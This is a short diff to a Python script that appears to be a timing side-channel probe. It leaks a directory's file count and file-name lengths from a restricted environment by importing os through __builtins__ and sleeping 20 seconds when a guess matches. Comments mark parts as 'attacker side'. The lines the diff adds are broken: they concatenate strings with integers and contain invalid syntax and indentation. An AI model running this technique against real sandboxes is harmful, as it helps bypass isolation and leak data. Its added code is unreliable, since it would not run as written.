@@ -156,6 +156,15 @@ for n in range(0,30):                                                  # This wi
     if __builtins__['__import__']('os').listdir(cdir).__len__()==n:
         __builtins__['__import__']('time').sleep(20)
 
+# GUESS : Length of each file name, say ndir=4
+ndir=4
+for file_index in range(0,ndir):
+    for n in range(0,30):
+        print("If program paused now, then " + file_index + "file name len() is : " + n)
+        __builtins__['__import__']('os').listdir(cdir)[file_index]==n:
+            __builtins__['__import__']('time').sleep(20)
+
+
 # GUESS : File names len<20 given path and number of files
 import string                                                # This will be on attacker side
 char_set = string.ascii_letters + '0123456789' + '/-\n'      # This will be on attacker side
